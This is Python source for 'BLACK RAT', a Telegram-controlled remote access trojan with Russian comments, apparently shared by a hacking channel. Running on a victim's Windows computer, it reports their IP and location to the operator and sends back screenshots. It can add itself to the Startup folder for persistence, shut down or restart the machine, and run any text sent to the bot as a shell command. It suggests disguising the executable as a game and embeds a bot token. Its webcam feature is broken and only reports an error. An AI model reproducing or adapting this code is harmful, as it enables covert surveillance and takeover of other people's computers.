# -*- coding: utf-8 -*-

######################################
#     Telegram: @blackcode_admin     #
######################################
#   TelegramChannel: @blackcode_tg   #
######################################
# GitHub: www.github.com/soblackcode #
######################################



import telebot 					# Библиотека для создание Telegram бота
import requests					# Библиотека для get/post запросов
import os 						# Библиотека для работы с системой
import subprocess 				# Библиотека для работы с системными командами					# Бибилиотека для фото с веб-камеры
from PIL import ImageGrab		# Модуль для скриншотов экрана
from datetime import datetime	# Модуль времени
from os import system 			# Библиотека для выполнения системных команд


token = '1404249799:AAGaUkJrU1_gcCCcaoiCx-F-M7OXBoDbqaA' # Вписываем Token вашего бота (@BotFather)
user_id = '802883577' # Вписываем ваш user_id (@userinfobot)
exe_name = '3456543.exe' # Будущее имя EXE файла (Пример: Minecraft.exe)

def new_target():
	# Назначем переменные заранее, чтобы избежать лишнего кода
	country = '-'
	region = '-'
	city = '-'
	timezone = '-'
	zipcode = '-'
	loc = '-'
	target_ip = requests.get('https://ip.42.pl/raw').text # Получаем IP
	url = 'https://ipinfo.io/' + target_ip + '/json' # URL для информации по IP
	json = requests.get(url).json() # Получаем json из содержимого страницы
	# Далее, просто проверяем наличие чего-то, если есть, то записываем в переменную
	if 'country' in json:
		country = json['country']
	if 'region' in json:
		region = json['region']
	if 'city' in json:
		city = json['city']
	if 'timezone' in json:
		timezone = json['timezone']
	if 'postal' in json:
		zipcode = json['postal']
	if 'loc' in json:
		loc = json['loc']
	target_date = datetime.today().strftime('%Y-%m-%d') # Дата у пользователя
	target_time = datetime.today().strftime('%H:%M') # Время у пользователя
	# Составляем сообщение для отправки ботом
	new_target_message = 'Пользователь включил РАТник/компьютер!\n\nIP: ' + target_ip + '\nCountry: ' + country
	new_target_message += '\nRegion: ' + region + '\nCity: ' + city + '\nTimeZone: ' + timezone
	new_target_message += '\nZipCode: ' + zipcode + '\nLocation: ' + loc
	new_target_message += '\nDate: ' + str(target_date) + '\nTime: ' + str(target_time)
	# Бот отправляет нам сообщение
	bot.send_message(user_id, new_target_message)


bot = telebot.TeleBot(token) # Создание самого бота


new_target() # Запуск функции для новой цели


# Если были введены /start или /help или /back
@bot.message_handler(commands=['start', 'back'])
def start_message(message):
	if str(message.chat.id) == user_id: # Если id пользователя = id админа, то...
		keyboard = telebot.types.ReplyKeyboardMarkup() # Создаём клавиатуру
		# Добавляем кнопки к клавиатуре
		keyboard.add('Получить IP', 'Скриншот Экрана')
		keyboard.add('Фото с Камеры', 'Сообщение')
		keyboard.add('Выключить Компьютер', 'Перезагрузить Компьютер')
		keyboard.add('Добавить RAT в автозагрузку')
		keyboard.add('/help')
		# Бот отправляет нам сообщение, к сообщению привязана клавиатура
		bot.send_message(user_id, 'Hello!\nIm BLACK RAT\n\nAuthor: @blackcode_admin\nChannel: @blackcode_tg', reply_markup=keyboard)
	else: # Если id пользователя не = id админа, то
		# Бот говорит, что этот бот не для тебя :)
		bot.send_message(message.chat.id, 'Sorry, but that bot not for you :)')


# Если была введена /help
@bot.message_handler(commands=['help'])
def help_message(message):
	if str(message.chat.id) == user_id: # Если id пользователя = id админа, то...
		help_mess = '''Нажимайте на кнопки, чтобы выполнить команды.
Если введёте ту команду, которой нет, то она выполнится в консоли.'''
		bot.send_message(user_id, help_mess) # Бот отправляет help текст
	else: # Если id пользователя не = id админа, то...
		# Бот говорит, что этот бот не для тебя
		bot.send_message(message.chat.id, 'Sorry, but that bot not for you :)')

# Если был отправлен просто текст
@bot.message_handler(content_types=['text'])
def text_message(message):
	if str(message.chat.id) == user_id: # Если id пользователя = id админа
		if message.text == 'Получить IP': # Если текст = Получить IP, то...
			# Берём IP пользователя
			target_ip = requests.get('https://ip.42.pl/raw').text
			# Отправляем нам IP пользователя
			bot.send_message(user_id, target_ip)
			# Берём json из ссылки на информацию по IP
			json = requests.get('https://ipinfo.io/' + target_ip + '/json').json()
			# Если локация есть в джсоне, то
			if 'loc' in json:
				loc = json['loc'] # Записываем локацию в переменную
				loc = loc.split(',') # Разделяем локацию по запятой
				# Отправляем локацию пользователя в виде GoogleMaps
				bot.send_location(user_id, float(loc[0]), float(loc[1]))
		elif message.text == 'Фото с Камеры':
			try: # Пытаемся получить фото с камеры
				# Включаём основную камеру
		                bot.send_message(user_id, 'Ошибка! У пользователя нет камеры!')
			except: # Если произошла ошибка
				bot.send_message(user_id, 'Ошибка! У пользователя нет камеры!')
		elif message.text == 'Скриншот Экрана': # Если текст = Скриншот Экрана, то..
			# Делаем скриншот
			screen = ImageGrab.grab()
			# Бот отправляет нам скриншот
			bot.send_photo(user_id, screen)
		elif message.text.startswith('Сообщение'): # Если текст начинается с "Сообщение"
			if message.text == 'Сообщение' or (len(message.text) > 9 and message.text[9] != ' '): # Если текст = Сообщение
				bot.send_message(user_id, 'Вы должны написать так - Сообщение <Текст>\nПример: Сообщение From BLACK CODE With Love<3')
			else: # Если текст не = Сообщение
				try: # Пробуем отправить сообщение и сделать скриншот
					# Делаем сообщение из команды пользователя
					message = message.text.replace('Сообщение ', '')
					command = 'msg * ' + message
					# Отправляем сообщение
					os.system(command)
					# Делаем скриншот
					screen = ImageGrab.grab()
					# Отправляем скриншот и текст
					bot.send_message(user_id, 'Готово!')
					bot.send_photo(user_id, screen)
				except: # Если произошла ошибка...
					bot.send_message(user_id, 'Неизвестная ошибка!')
		elif message.text == 'Выключить Компьютер': # Если текст = Выключить Компьютер
			bot.send_message(user_id, 'Компьютер Выключен!\nБот не будет работать')
			os.system('shutdown /s /t 1') # Команда для выключения компьютера
		elif message.text == 'Перезагрузить Компьютер': # Если текст = Перезагрузить Компьютер
			bot.send_message(user_id, 'Компьютер перезагружается...')
			os.system('shutdown /r /t 1') # Команда для перезагрузки компютера
		elif message.text == 'Добавить RAT в автозагрузку': # Если текст = Добавить RAT в автозагрузку
			try: # Пробуем добавить программу в автозагрузку
				command = 'copy ' + exe_name + ' "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"' # Составление команды для добавления в автозагрузку
				subprocess.check_call(command, shell=True) # Выполнение добавления в автозагрузку
				bot.send_message(user_id, 'РАТник успешно добавлен в автозагрузку!')
			except: # Если ошибка, то бот отправляет об этом сообщение
				bot.send_message(user_id, 'Ошибка!')
		else: # Если текст != командам, то текст выполняете в коносли
			try: # Пытаемся выполнить и отправить текст
				output = subprocess.check_output(message.text, shell=True)
				output = str(output)
				output = output[2:]
				output = output[:-1]
				bot.send_message(user_id, output)
			except: # Если произошла ошибка
				pass # Заглушка
	else: # Если id пользователя не = id админа, то..
		# Бот говорит, что данный бот не для тебя
		bot.send_message(message.chat.id, 'Sorry, but that bot not for you :)')


bot.polling(none_stop=True, interval=0, timeout=30) # Запуск бота
